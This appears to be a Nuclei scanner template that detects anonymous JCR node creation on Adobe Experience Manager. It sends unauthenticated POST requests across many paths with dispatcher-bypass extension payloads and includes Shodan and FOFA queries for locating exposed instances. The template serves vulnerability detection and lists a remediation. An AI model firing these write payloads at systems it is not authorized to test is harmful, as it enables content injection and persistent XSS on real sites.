flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - Welcome to Adobe Experience Manager
  max-redirects: 2
  method: GET
  path:
  - '{{BaseURL}}'
  redirects: true
- attack: clusterbomb
  matchers:
  - part: body
    type: word
    words:
    - <td>Parent Location</td>
  - status:
    - 201
    type: status
  matchers-condition: and
  payloads:
    extension:
    - '{{nodename}}*'
    - '{{nodename}}.json'
    - '{{nodename}}.1.json'
    - '{{nodename}}.json/{{random}}.css'
    - '{{nodename}}.json/{{random}}.html'
    path:
    - /
    - /apps/
    - /libs/
    - /content/
    - /content/usergenerated/
    - /content/usergenerated/etc/commerce/smartlists/
  raw:
  - 'POST {{path}}{{extension}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    <html>{{marker}}</html>

    '
  stop-at-first-match: true
id: aem-anonymous-write
info:
  author: DhiyaneshDk,0ang3el
  classification:
    cpe: cpe:2.3:a:adobe:experience_manager:*:*:*:*:*:*:*:*
  description: 'Anonymous users can create new JCR nodes via the AEM POST Servlet,
    which may allow attackers to inject malicious content, achieve persistent XSS,
    or abuse servlets registered by resource types for further attacks.

    '
  impact: 'Successful exploitation allows unauthenticated attackers to create arbitrary
    JCR nodes, potentially leading to persistent cross-site scripting (XSS), content
    injection, or exploitation of servlets registered to handle specific resource
    types.

    '
  metadata:
    fofa-query: body="/libs/granite/core/content/login.html"
    product: experience_manager
    shodan-query: http.component:"Adobe Experience Manager"
    vendor: adobe
    verified: true
  name: Adobe Experience Manager (AEM) - Anonymous JCR Node Creation
  reference:
  - https://clarkvoss.medium.com/the-cve-that-will-never-die-86149b450840
  - https://github.com/0ang3el/aem-hacker/blob/master/aem_hacker.py
  remediation: 'Configure proper access control lists (ACLs) on AEM paths to prevent
    anonymous users from creating JCR nodes. Review and restrict permissions on the
    POST servlet to authenticated users only.

    '
  severity: high
  tags: aem,adobe,intrusive,node
variables:
  marker: '{{to_lower(rand_text_alpha(6))}}'
  nodename: '{{to_lower(rand_text_alpha(5))}}'
  random: '{{to_lower(rand_text_alpha(10))}}'
